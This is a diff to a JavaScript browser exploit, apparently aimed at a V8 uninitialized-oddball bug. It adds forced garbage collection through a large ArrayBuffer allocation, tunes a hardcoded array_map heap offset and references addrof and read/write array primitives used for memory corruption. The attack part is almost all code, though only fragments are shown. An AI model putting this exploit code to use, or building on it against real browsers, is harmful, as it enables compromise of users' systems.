@@ -8,11 +8,16 @@ function hex(val){
     return "0x"+val.toString(16);
 }
 
+function major_gc() {
+        new ArrayBuffer(0x7fe00000);
+    }
+
 // Line ~400+ is to trigger the bug, anything before that is for the exploit
 
 let corrupted_array = new Array(1367);
 corrupted_array.fill(1.1);
-
+major_gc();
+major_gc();
 let rw_array = new Array(10000);
 rw_array.fill(1.1);
 let addrof_array = new Array(1338);
@@ -221,8 +226,8 @@ function UninitializedOddballExploiter(uninitialized_oddball) {
         // alert("dbg");
         const old_space = 0x200000;
         //0x2c3741
-        //0x2a01
-        const array_map = 0x27c691;
+        //0027be49
+        const array_map = 0x27be49;
 
         let start_offset = Math.floor(old_space / 8) + 3;
         try{
@@ -638,7 +643,7 @@ function main() {
     
     if(typeof(glob_uninitialized_oddball) != "undefined"){
         // alert(typeof(glob_uninitialized_oddball));
-        location.hred = "test14.html"
+        location.hred = "test15.html"
         window.location.reload();
         // console.log("1");
         // window.location.reload();
